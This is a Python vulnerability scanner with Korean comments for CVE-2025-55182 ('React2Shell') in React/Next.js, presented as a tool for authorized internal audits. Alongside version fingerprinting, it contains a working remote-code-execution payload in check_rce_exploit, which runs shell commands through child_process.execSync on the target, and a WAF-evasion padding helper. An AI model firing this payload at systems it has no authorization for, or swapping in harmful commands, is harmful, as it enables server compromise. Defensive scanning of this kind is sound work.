#!/usr/bin/env python3
"""
CVE-2025-55182 (React2Shell) 내부 시스템 취약점 확인 스크립트 (개선됨)
 용도: 내부 보안 점검용 (인가된 시스템만 대상으로 사용)

 개선사항:
  - React DevTools Hook 방식 사용 (domain-monitoring 방식)
  - React 19/Next.js 15, 16 취약 버전 정확 감지
  - 자바스크립트 기반 버전 탐지
  - Playwright 브라우저 자동화 사용 (실제 JavaScript 실행)
  - Safe-Check 모드 (Assetnote 방식)
  - RCE 검증 모드 (Nuclei 방식)
  - WAF 바이패스 지원
  - rsc-action-id 헤더 검사
  - Windows PowerShell 지원
  - 리다이렉트 팔로우 지원

 확인 항목:
   1. React/Next.js 버전 확인 (취약 버전 여부)
   2. React Server Components 엔드포인트 존재 여부
   3. RSC Flight 프로토콜 응답 패턴 확인
 """

import requests
import sys
import os
import json
import re
import urllib3
import time
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse

try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# SSL 경고 무시 (내부망 자체서명 인증서 대응)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 취약 버전 정의 (CVE-2025-55182)
VULNERABLE_VERSIONS = {
    "react": {
        "min": "19.0.0",
        "patched": "19.0.1"  # 패치된 버전
    },
    "next": {
        "vulnerable_ranges": [
            {"min": "15.0.0", "patched": "15.1.4"},
            {"min": "16.0.0", "patched": "16.0.7"}
        ]
    }
}

# RSC 탐지용 헤더/패턴 (domain-monitoring에서 차용)
RSC_INDICATORS = {
    "headers": {
        "RSC": "1",
        "Next-Router-State-Tree": "",
        "Next-Router-Prefetch": "1"
    },
    "content_types": [
        "text/x-component",
        "application/x-rsc"
    ],
    "response_patterns": [
        r"^\d+:",  # RSC Flight 프로토콜 응답 패턴
        r"^\$",    # RSC 직렬화 마커
    ],
    "error_patterns": [
        r'E\{"digest"',  # Next.js RSC 에러 패턴
        r'"digest"',
    ]
}

# React DevTools Hook 스크립트 (domain-monitoring의 browser_fingerprint.go에서 차용)
REACT_DEVTOOLS_HOOK = """
// React DevTools Global Hook 주입
window.__REACT_DEVTOOLS_GLOBAL_HOOK__ = {
    checkDCE: function() { return true; },
    supportsFiber: true,
    renderers: new Map(),
    onCommitFiberRoot: function(id, root, priorityLevel) {},
    onCommitFiberUnmount: function() {},
    inject: function(renderer) {
        const id = Math.random().toString(16).slice(2);
        this.renderers.set(id, renderer);
        return id;
    }
};
"""

# React 버전 탐지 자바스크립트 (domain-monitoring 방식)
REACT_VERSION_DETECTION_SCRIPT = """
(function() {
    const results = [];

    // React 19 버전 감지 (React DevTools Hook 사용)
    try {
        if (window.__REACT_DEVTOOLS_GLOBAL_HOOK__?.renderers) {
            const renderers = Array.from(window.__REACT_DEVTOOLS_GLOBAL_HOOK__.renderers.values());
            renderers.forEach((renderer) => {
                if (renderer.version) {
                    results.push({
                        name: 'React',
                        version: renderer.version,
                        category: 'javascript_library',
                        confidence: 0.99,
                        detected_by: 'javascript:react_devtools_hook'
                    });
                }
            });
        }
    } catch (e) {
        // DevTools Hook 사용 불가
    }

    // React 19 다른 방식 감지
    try {
        if (window.React) {
            const version = window.React.version ||
                window.React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED?.ReactVersion;
            if (version) {
                results.push({
                    name: 'React',
                    version: version,
                    category: 'javascript_library',
                    confidence: 0.95,
                    detected_by: 'javascript:window.React'
                });
            }
        }
    } catch (e) {}

    // Next.js 감지
    try {
        if (window.__NEXT_DATA__) {
            const buildId = window.__NEXT_DATA__.buildId;
            // Next.js 감지 - 버전은 직접 접근 불가
            results.push({
                name: 'Next.js',
                version: '',
                category: 'framework',
                confidence: 0.95,
                detected_by: 'javascript:__NEXT_DATA__'
            });
        }
    } catch (e) {}

    return JSON.stringify(results);
})();
"""


def parse_version(version_str):
    """버전 문자열을 비교 가능한 튜플로 변환"""
    try:
        # v 접두사 제거, 추가 태그 제거 (예: 19.0.0-rc.1)
        clean = re.sub(r'^v', '', version_str)
        clean = re.split(r'[-+]', clean)[0]
        parts = clean.split('.')
        return tuple(int(p) for p in parts[:3])
    except:
        return (0, 0, 0)


def is_version_vulnerable(version, framework="react"):
    """버전이 취약한지 확인 (CVE-2025-55182)"""
    v = parse_version(version)

    if framework == "react":
        min_v = parse_version(VULNERABLE_VERSIONS["react"]["min"])
        patched_v = parse_version(VULNERABLE_VERSIONS["react"]["patched"])
        return min_v <= v < patched_v

    elif framework == "next":
        for range_info in VULNERABLE_VERSIONS["next"]["vulnerable_ranges"]:
            min_v = parse_version(range_info["min"])
            patched_v = parse_version(range_info["patched"])
            if min_v <= v < patched_v:
                return True
    return False


def check_safe_side_channel(url, timeout=10):
    """
    Assetnote-style Safe-Check 모드
    실제 RCE 실행 없이 500 상태 코드 + 에러 digest로 취약점 확인
    """
    result = {
        "url": url,
        "method": "safe_check",
        "vulnerable": False,
        "status_code": None,
        "error": None,
        "indicators": []
    }

    try:
        # Server Action 트리거용 간단한 페이로드
        # 실제로는 아무것도 실행하지 않지만 RSC 파싱 과정에서 에러 발생
        headers = {
            "Next-Action": "a" * 40,
            "User-Agent": "Mozilla/5.0 (Internal Security Scanner)"
        }

        resp = requests.post(
            url,
            headers=headers,
            timeout=timeout,
            verify=False
        )

        result["status_code"] = resp.status_code

        # Safe-Check: 500 상태 코드 + RSC 에러 패턴
        if resp.status_code == 500:
            for pattern in RSC_INDICATORS["error_patterns"]:
                if re.search(pattern, resp.text[:2000]):
                    result["vulnerable"] = True
                    result["indicators"].append("Safe-Check: 500 + RSC error pattern detected")
                    break

        if not result["vulnerable"] and resp.status_code != 404:
            result["indicators"].append(f"Safe-Check: Received status {resp.status_code} (not 500)")

    except Exception as e:
        result["error"] = str(e)[:100]

    return result


def check_rce_exploit(url, timeout=10, platform="unix"):
    """
    Nuclei-style RCE 검증 모드
    결정적 수학 연산(41*271=11111)으로 실제 RCE 실행 여부 확인
    """
    num1 = 41
    num2 = 271
    result_num = num1 * num2  # 11111

    result = {
        "url": url,
        "method": "rce_verification",
        "vulnerable": False,
        "platform": platform,
        "result": None,
        "error": None,
        "indicators": []
    }

    try:
        # RCE 페이로드 (Nuclei/Assetnote 방식)
        # $@ 청크 참조 + "status":"resolved_model" + process.mainModule.require
        if platform == "windows":
            cmd_payload = 'powershell -c "{num1}*{num2}"'.replace("{num1}", str(num1)).replace("{num2}", str(num2))
        else:  # unix/linux
            cmd_payload = 'echo $(({num1}*{num2}))'.replace("{num1}", str(num1)).replace("{num2}", str(num2))

        payload = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": '{"then":"$B1337"}',
            "_response": {
                "_prefix": 'var res=process.mainModule.require("child_process").execSync("' + cmd_payload + '").toString().trim();throw Object.assign(new Error("NEXT_REDIRECT"),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`}});',
                "_chunks": "$Q2",
                "_formData": {"get": "$1:constructor:constructor"}
            }
        }

        headers = {
            "Next-Action": "x",
            "X-Nextjs-Request-Id": "test-" + str(int(time.time())),
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Internal Security Scanner)"
        }

        resp = requests.post(
            url,
            headers=headers,
            json=payload,
            timeout=timeout,
            verify=False,
            allow_redirects=False
        )

        # 리다이렉트 헤더 확인 (결과가 포함되어야 함)
        x_action_redirect = resp.headers.get("X-Action-Redirect", "")

        # 계산된 결과가 포함되어 있는지 확인
        if str(result_num) in x_action_redirect:
            result["vulnerable"] = True
            result["result"] = result_num
            result["indicators"].append(f"RCE Verified: Math operation {num1}*{num2}={result_num} successful")
            result["indicators"].append(f"X-Action-Redirect: {x_action_redirect}")

        # 다른 리다이렉트 응답도 체크
        elif resp.status_code in [307, 308]:
            location = resp.headers.get("Location", "")
            if str(result_num) in location:
                result["vulnerable"] = True
                result["result"] = result_num
                result["indicators"].append(f"RCE Verified: Math operation {num1}*{num2}={result_num} successful")
                result["indicators"].append(f"Location: {location}")

    except Exception as e:
        result["error"] = str(e)[:100]

    return result


def add_waf_bypass(payload, size_kb=128):
    """
    WAF 바이패스 지원
    128KB 정크 데이터를 앞에 추가하여 WAF 컨텐츠 검사 회피
    """
    junk_data = 'A' * (size_kb * 1024)
    return junk_data + str(payload)


def check_with_redirects(url, timeout=10):
    """
    리다이렉트 팔로우 지원
    동일 호스트 리다이렉트를 따라 RSC 엔드포인트 발견
    """

    original_netloc = urlparse(url).netloc
    result = {
        "url": url,
        "final_url": None,
        "redirects": [],
        "indicators": []
    }

    try:
        resp = requests.get(
            url,
            timeout=timeout,
            verify=False,
            allow_redirects=True,
            headers={"User-Agent": "Mozilla/5.0 (Internal Security Scanner)"}
        )

        result["final_url"] = resp.url

        # 동일 호스트 리다이렉트인지 확인
        if urlparse(resp.url).netloc == original_netloc:
            result["indicators"].append(f"Same-host redirect: {url} -> {resp.url}")
            # 실제 스캔은 리다이렉트된 URL로 수행 필요
            result["rsc_target"] = resp.url
        else:
            result["indicators"].append("Redirected to different host (not following)")

    except Exception as e:
        result["error"] = str(e)[:100]

    return result


def extract_react_version_from_html(html):
    """HTML에서 React 버전 추출 (domain-monitoring 방식)"""
    version = None

    # React 루트 div 감지
    if re.search(r'<div id="root">', html) or re.search(r'<div id="__next">', html):
        # React가 감지되었지만 버전은 직접적으로 확인 필요
        pass

    # Next.js 빌드 ID 추출 시도
    next_data_match = re.search(r'"buildId":"([^"]+)"', html)
    if next_data_match:
        # Next.js 감지 - 버전은 다른 방식으로 확인 필요
        pass

    return version


def check_react_via_browser(url, timeout=10):
    """Playwright 브라우저 자동화로 React/Next.js 버전 탐지"""
    results = {
        'react_detected': False,
        'nextjs_detected': False,
        'react_version': '',
        'nextjs_version': '',
        'method': 'browser_automation',
        'indicators': []
    }

    if not PLAYWRIGHT_AVAILABLE:
        return {'error': 'Playwright not installed'}

    try:
        from playwright.sync_api import sync_playwright
        import time as time_module

        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            page.set_default_timeout(timeout * 1000)

            # CRITICAL: Inject DevTools hooks BEFORE page loads
            # This is how browser DevTools actually work!
            page.add_init_script(REACT_DEVTOOLS_HOOK)

            # Now navigate - React will see our hook and register itself
            page.goto(url, wait_until="domcontentloaded", timeout=timeout * 1000)

            # Wait for React to fully initialize and register with our hook
            time_module.sleep(3)

            react_version = page.evaluate('''() => {
                if (window.__REACT_DEVTOOLS_GLOBAL_HOOK__?.renderers) {
                    const renderers = Array.from(window.__REACT_DEVTOOLS_GLOBAL_HOOK__.renderers.values());
                    for (const renderer of renderers) {
                        if (renderer.version) {
                            return renderer.version;
                        }
                    }
                }
                if (window.React && window.React.version) {
                    return window.React.version;
                }
                return null;
            }''')

            nextjs_version = page.evaluate('() => window.next?.version || null')

            if react_version:
                results['react_detected'] = True
                results['react_version'] = react_version
                results['indicators'].append(f"React version (DevTools Hook): {react_version}")

            if nextjs_version:
                results['nextjs_detected'] = True
                results['nextjs_version'] = nextjs_version
                results['indicators'].append(f"Next.js version (window.next): {nextjs_version}")

            if not react_version and not nextjs_version:
                results['nextjs_detected'] = bool(page.evaluate('() => window.__NEXT_DATA__'))
                results['react_detected'] = bool(page.evaluate('() => !!document.getElementById("root") || !!document.getElementById("__next")'))

            if not results['react_version'] and not results['nextjs_version']:
                results['indicators'].append("Browser automation: No version detected via window object")

            browser.close()
    except Exception as e:
        results['error'] = f'{type(e).__name__}: {str(e)[:100]}'
        results['indicators'].append(f"Browser automation failed: {results['error']}")

    return results


def check_react_via_javascript(session, url, timeout=10):
    """자바스크립트 실행으로 React/Next.js 버전 탐지 (domain-monitoring 방식)"""
    results = {
        'react_detected': False,
        'nextjs_detected': False,
        'react_version': '',
        'nextjs_version': '',
        'method': 'javascript_detection'
    }

    try:
        resp = session.get(
            url,
            timeout=timeout,
            verify=False,
            headers={
                "User-Agent": "Mozilla/5.0 (Internal Security Scanner)",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }
        )

        html = resp.text

        react_patterns = [
            r'/react@([0-9.]+)/',
            r'/react\.production\.(?:min\.)?js',
            r'/react-dom\.(?:min\.)?js',
            r'window\.React\.version\s*=\s*["\']([0-9.]+)["\']',
        ]

        for pattern in react_patterns:
            match = re.search(pattern, html)
            if match:
                if len(match.groups()) > 0:
                    results['react_detected'] = True
                    results['react_version'] = match.group(1)
                    break
                else:
                    results['react_detected'] = True

        nextjs_patterns = [
            r'next[/\\]([0-9.]+)',
            r'"next"\s*:\s*"([0-9.]+)"',
            r'"nextVersion"\s*:\s*"([0-9.]+)"',
        ]

        for pattern in nextjs_patterns:
            match = re.search(pattern, html)
            if match:
                results['nextjs_detected'] = True
                results['nextjs_version'] = match.group(1)
                break

        if '__NEXT_DATA__' in html or '/_next/' in html:
            results['nextjs_detected'] = True

        if '<div id="root">' in html or '<div id="__next">' in html:
            results['react_detected'] = True

    except Exception as e:
        results['error'] = str(e)

    return results


def extract_nextjs_version_from_chunks(base_url, html_content, timeout=5):
    """
    Extract Next.js version from chunk files (domain-monitoring method)
    Checks up to 8 chunk files with 4 different version patterns

    This function mirrors the Go implementation from domain-monitoring/internal/scanner/cve/fingerprint.go
    It significantly improves detection accuracy compared to checking only webpack.js
    """
    import re

    # 1. Extract all chunk file paths from HTML
    chunk_pattern = re.compile(r'/_next/static/chunks/([^"\']+\.js)')
    chunks = chunk_pattern.findall(html_content)

    if not chunks:
        return None

    # 2. Version patterns (from domain-monitoring fingerprint.go:2077-2164)
    version_patterns = [
        r'window\.next\s*=\s*\{\s*version\s*:\s*["\'](\d+\.\d+\.\d+[^"\']*)["\'"]',  # Pattern 0: window.next={version:"14.2.29"}
        r'["\']next["\']\s*:\s*["\'](\d+\.\d+\.\d+[^"\']*)["\'"]',                    # Pattern 1: "next":"14.2.29"
        r'next@(\d+\.\d+\.\d+)',                                                       # Pattern 2: next@14.2.29
        r'name:\s*["\']next["\']\s*,\s*version:\s*["\'](\d+\.\d+\.\d+[^"\']*)["\'"]', # Pattern 3: {name:"next",version:"14.2.29"}
    ]

    # 3. Check up to 8 chunks (like domain-monitoring)
    for i, chunk in enumerate(chunks[:8]):
        chunk_url = f"{base_url.rstrip('/')}/_next/static/chunks/{chunk}"
        try:
            resp = requests.get(chunk_url, timeout=timeout, verify=False)
            if resp.status_code == 200:
                # Limit content to 300KB like Go version (300 * 1024 bytes)
                content = resp.text[:307200]

                # Try all patterns
                for pattern_idx, pattern in enumerate(version_patterns):
                    match = re.search(pattern, content)
                    if match:
                        version = match.group(1)
                        return version
        except Exception:
            # Continue to next chunk if this one fails
            continue

    return None


def check_rsc_endpoint(url, timeout=10, safe_check=True, rce_verify=False, follow_redirects=False, platform="unix"):
    """
    RSC 엔드포인트 존재 여부 확인 (개선됨)

    Args:
        url: 타겟 URL
        timeout: 요청 타임아웃
        safe_check: Assetnote-style Safe-Check 모드 (기본값: True)
        rce_verify: Nuclei-style RCE 검증 모드 (기본값: False)
        follow_redirects: 리다이렉트 팔로우 (기본값: False)
        platform: 플랫폼 - unix 또는 windows (RCE 검증용)
    """
    results = {
        "url": url,
        "rsc_detected": False,
        "version_info": {},
        "indicators": [],
        "status": "unknown",
        "error": None,
        "safe_check_result": None,
        "rce_verify_result": None
    }

    # 리다이렉트 팔로우 옵션 처리
    scan_url = url
    if follow_redirects:
        redirect_result = check_with_redirects(url, timeout)
        if "rsc_target" in redirect_result:
            scan_url = redirect_result["rsc_target"]
            results["indicators"].extend(redirect_result["indicators"])

    try:
        # 1. 기본 요청으로 Next.js/React 확인
        resp = requests.get(
            url,
            timeout=timeout,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (Internal Security Scanner)"}
        )

        # Next.js 버전 확인 (X-Powered-By 또는 응답에서)
        powered_by = resp.headers.get("X-Powered-By", "")
        if "Next.js" in powered_by:
            results["indicators"].append(f"X-Powered-By: {powered_by}")

        # _next 경로 확인
        if "/_next/" in resp.text:
            results["indicators"].append("Next.js asset path detected")

        # 2. 브라우저 자동화로 React/Next.js 버전 탐지 (Playwright)
        if PLAYWRIGHT_AVAILABLE:
            js_detection = check_react_via_browser(url, timeout)
        else:
            js_detection = check_react_via_javascript(
                requests.Session(),
                url,
                timeout
            )

        if js_detection.get('react_version'):
            results["version_info"]["react"] = js_detection['react_version']
            if is_version_vulnerable(js_detection['react_version'], "react"):
                results["indicators"].append(f"VULNERABLE React version: {js_detection['react_version']}")

        if js_detection.get('nextjs_version'):
            results["version_info"]["next"] = js_detection['nextjs_version']
            if is_version_vulnerable(js_detection['nextjs_version'], "next"):
                results["indicators"].append(f"VULNERABLE Next.js version: {js_detection['nextjs_version']}")

        if safe_check:
            safe_result = check_safe_side_channel(scan_url, timeout)
            results["safe_check_result"] = safe_result
            if safe_result["vulnerable"]:
                results["vulnerable"] = True
                results["indicators"].extend(safe_result["indicators"])

        if rce_verify:
            rce_result = check_rce_exploit(scan_url, timeout, platform)
            results["rce_verify_result"] = rce_result
            if rce_result["vulnerable"]:
                results["vulnerable"] = True
                results["indicators"].extend(rce_result["indicators"])

        rsc_headers = {
            "RSC": "1",
            "Next-Router-State-Tree": "%5B%22%22%5D",
            "User-Agent": "Mozilla/5.0 (Internal Security Scanner)"
        }

        rsc_action_id_headers = {
            "rsc-action-id": "test",
            "Next-Action": "test",
            "User-Agent": "Mozilla/5.0 (Internal Security Scanner)"
        }

        rsc_resp = requests.get(
            scan_url,
            headers=rsc_headers,
            timeout=timeout,
            verify=False
        )

        rsc_action_id_resp = requests.get(
            scan_url,
            headers=rsc_action_id_headers,
            timeout=timeout,
            verify=False
        )

        content_type = rsc_resp.headers.get("Content-Type", "")
        for ct in RSC_INDICATORS["content_types"]:
            if ct in content_type:
                results["rsc_detected"] = True
                results["indicators"].append(f"RSC Content-Type: {content_type}")

        for pattern in RSC_INDICATORS["response_patterns"]:
            if re.search(pattern, rsc_resp.text[:100]):
                results["rsc_detected"] = True
                results["indicators"].append("RSC Flight protocol response detected")
                break

        for pattern in RSC_INDICATORS["error_patterns"]:
            if re.search(pattern, rsc_resp.text[:2000]):
                results["rsc_detected"] = True
                results["indicators"].append("RSC error response detected")
                break

        for pattern in RSC_INDICATORS["response_patterns"]:
            if re.search(pattern, rsc_action_id_resp.text[:100]):
                results["rsc_detected"] = True
                results["indicators"].append("rsc-action-id header response detected")
                break

        for pattern in RSC_INDICATORS["error_patterns"]:
            if re.search(pattern, rsc_action_id_resp.text[:2000]):
                results["rsc_detected"] = True
                results["indicators"].append("rsc-action-id error response detected")
                break

        # Next.js 버전 탐지 (domain-monitoring 방식 - 8개 청크 + 4가지 패턴)
        nextjs_version = extract_nextjs_version_from_chunks(scan_url, resp.text)
        if nextjs_version:
            if "next" not in results["version_info"]:
                results["version_info"]["next"] = nextjs_version
            if is_version_vulnerable(nextjs_version, "next"):
                results["indicators"].append(f"VULNERABLE Next.js version: {nextjs_version}")
            else:
                results["indicators"].append(f"Next.js version: {nextjs_version}")

        # 상태 결정
        if results["rsc_detected"]:
            if any("VULNERABLE" in ind for ind in results["indicators"]):
                results["status"] = "VULNERABLE"
            else:
                results["status"] = "RSC_ENABLED_CHECK_VERSION"
        elif results["indicators"]:
            results["status"] = "NEXTJS_DETECTED"
        else:
            results["status"] = "NOT_DETECTED"

    except requests.exceptions.Timeout:
        results["status"] = "TIMEOUT"
        results["error"] = "Connection timeout"
    except requests.exceptions.ConnectionError as e:
        results["status"] = "CONNECTION_ERROR"
        results["error"] = str(e)[:100]
    except Exception as e:
        results["status"] = "ERROR"
        results["error"] = str(e)[:100]

    return results


def scan_targets(targets, max_workers=10, safe_check=True, rce_verify=False, follow_redirects=False, platform="unix"):
    """여러 대상 동시 스캔"""
    results = []

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_url = {
            executor.submit(check_rsc_endpoint, url, 10, safe_check, rce_verify, follow_redirects, platform): url
            for url in targets
        }

        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
                results.append(result)

                # 실시간 출력
                status_icon = {
                    "VULNERABLE": "🔴",
                    "RSC_ENABLED_CHECK_VERSION": "🟡",
                    "NEXTJS_DETECTED": "🟢",
                    "NOT_DETECTED": "⚪",
                    "TIMEOUT": "⏱️",
                    "CONNECTION_ERROR": "❌",
                    "ERROR": "❌"
                }.get(result["status"], "❓")

                print(f"{status_icon} [{result['status']}] {url}")
                if result["indicators"]:
                    for ind in result["indicators"]:
                        print(f"   └─ {ind}")

            except Exception as e:
                print(f"❌ [ERROR] {url}: {e}")

    return results


def generate_report(results, output_file=None):
    """스캔 결과 보고서 생성"""
    report = {
        "scan_time": datetime.now().isoformat(),
        "summary": {
            "total": len(results),
            "vulnerable": 0,
            "rsc_enabled": 0,
            "nextjs_detected": 0,
            "not_detected": 0,
            "errors": 0
        },
        "vulnerable_systems": [],
        "requires_review": [],
        "all_results": results
    }

    for r in results:
        if r["status"] == "VULNERABLE":
            report["summary"]["vulnerable"] += 1
            report["vulnerable_systems"].append(r)
        elif r["status"] == "RSC_ENABLED_CHECK_VERSION":
            report["summary"]["rsc_enabled"] += 1
            report["requires_review"].append(r)
        elif r["status"] == "NEXTJS_DETECTED":
            report["summary"]["nextjs_detected"] += 1
        elif r["status"] == "NOT_DETECTED":
            report["summary"]["not_detected"] += 1
        else:
            report["summary"]["errors"] += 1

    # 콘솔 요약 출력
    print("\n" + "="*60)
    print("CVE-2025-55182 (React2Shell) 스캔 결과 요약")
    print("="*60)
    print(f"스캔 시간: {report['scan_time']}")
    print(f"총 대상: {report['summary']['total']}")
    print(f"🔴 취약 확인: {report['summary']['vulnerable']}")
    print(f"🟡 RSC 활성화 (버전 확인 필요): {report['summary']['rsc_enabled']}")
    print(f"🟢 Next.js 감지: {report['summary']['nextjs_detected']}")
    print(f"⚪ 미감지: {report['summary']['not_detected']}")
    print(f"❌ 오류: {report['summary']['errors']}")

    if report["vulnerable_systems"]:
        print("\n⚠️  즉시 패치 필요 시스템:")
        for v in report["vulnerable_systems"]:
            print(f"   - {v['url']}")
            if v.get('version_info'):
                print(f"     React: {v['version_info'].get('react', 'N/A')}, Next.js: {v['version_info'].get('next', 'N/A')}")

    if report["requires_review"]:
        print("\n📋 수동 버전 확인 필요:")
        for r in report["requires_review"]:
            print(f"   - {r['url']}")

    # 파일 출력
    if output_file:
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
        print(f"\n📁 상세 보고서 저장: {output_file}")

    return report


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="CVE-2025-55182 (React2Shell) 취약점 스캐너 - 개선됨",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예제:
  %(prog)s https://example.com
  %(prog)s urls.txt --rce-verify
  %(prog)s https://target.com --platform windows --follow-redirects
  %(prog)s urls.txt -o results.json -t 20
        """
    )

    parser.add_argument(
        "targets",
        nargs="+",
        help="타겟 URL 또는 URL 목록 파일"
    )

    parser.add_argument(
        "-o", "--output",
        help="JSON 결과 파일 경로"
    )

    parser.add_argument(
        "-t", "--threads",
        type=int,
        default=10,
        help="멀티스레드 수 (기본값: 10)"
    )

    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="타임아웃 초 (기본값: 10)"
    )

    parser.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="간략 출력 모드"
    )

    parser.add_argument(
        "--safe-check",
        action="store_true",
        default=True,
        help="Assetnote-style Safe-Check 모드 (기본값: 활성화)"
    )

    parser.add_argument(
        "--rce-verify",
        action="store_true",
        default=False,
        help="Nuclei-style RCE 검증 모드 (기본값: 비활성화)"
    )

    parser.add_argument(
        "--platform",
        choices=["unix", "windows"],
        default="unix",
        help="플랫폼 선택 (기본값: unix)"
    )

    parser.add_argument(
        "--follow-redirects",
        action="store_true",
        default=False,
        help="리다이렉트 팔로우 (기본값: 비활성화)"
    )

    return parser.parse_args()


def main():
    args = parse_arguments()

    print("""
╔═══════════════════════════════════════════════════════════════╗
║  CVE-2025-55182 (React2Shell) 내부 시스템 취약점 스캐너      ║
║  개선됨: domain-monitoring 방식 (React DevTools Hook)          ║
║  용도: 인가된 내부 보안 점검 전용                            ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    targets = []
    for arg in args.targets:
        if arg.startswith(('http://', 'https://')):
            targets.append(arg)
        elif os.path.isfile(arg):
            try:
                with open(arg, 'r', encoding='utf-8') as f:
                    file_targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    for url in file_targets:
                        if not url.startswith(('http://', 'https://')):
                            url = 'https://' + url
                        targets.append(url)
            except Exception as e:
                print(f"❌ 파일 읽기 오류 ({arg}): {e}")
        else:
            targets.append('https://' + arg)

    if not targets:
        print("❌ 스캔할 대상이 없습니다.")
        sys.exit(1)

    mode_info = []
    if args.safe_check:
        mode_info.append("Safe-Check")
    if args.rce_verify:
        mode_info.append("RCE 검증")
    if args.follow_redirects:
        mode_info.append("리다이렉트 팔로우")

    mode_str = ", ".join(mode_info) if mode_info else "기본 모드"
    platform_str = f" ({args.platform})" if args.rce_verify else ""

    print(f"\n🔍 {len(targets)}개 대상 스캔 시작... [{mode_str}{platform_str}]\n")

    # 스캔 실행
    results = scan_targets(targets, args.threads, args.safe_check, args.rce_verify, args.follow_redirects, args.platform)

    # 보고서 생성
    output_file = args.output if args.output else f"react2shell_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    generate_report(results, output_file)

    # 취약 시스템 있으면 종료 코드 1
    vulnerable_count = sum(1 for r in results if r["status"] == "VULNERABLE")
    sys.exit(1 if vulnerable_count > 0 else 0)


if __name__ == "__main__":
    main()
